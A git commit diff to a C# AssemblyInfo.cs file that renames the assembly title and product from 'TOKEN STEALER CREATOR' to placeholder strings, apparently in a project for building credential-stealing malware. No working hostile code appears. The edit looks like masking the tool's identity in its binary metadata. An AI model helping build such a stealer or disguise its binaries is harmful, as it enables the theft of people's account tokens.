a5c78134049c0a039217db8a1196864181817754
Itroublve <51215044+Itroublve@users.noreply.github.com>
2020-07-28 18:15:57 +0200

    Add files via upload

--- DLL and BINS/bin/Properties/AssemblyInfo.cs
+++ DLL and BINS/bin/Properties/AssemblyInfo.cs
@@ -5,12 +5,12 @@ using System.Runtime.InteropServices;
 // General Information about an assembly is controlled through the following
 // set of attributes. Change these attribute values to modify the information
 // associated with an assembly.
-[assembly: AssemblyTitle("TOKEN STEALER CREATOR")]
-[assembly: AssemblyDescription("")]
+[assembly: AssemblyTitle("titel")]
+[assembly: AssemblyDescription("deskription")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("TOKEN STEALER CREATOR")]
-[assembly: AssemblyCopyright("Copyright ©  2020")]
+[assembly: AssemblyProduct("produkt")]
+[assembly: AssemblyCopyright("rightcopy")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
 
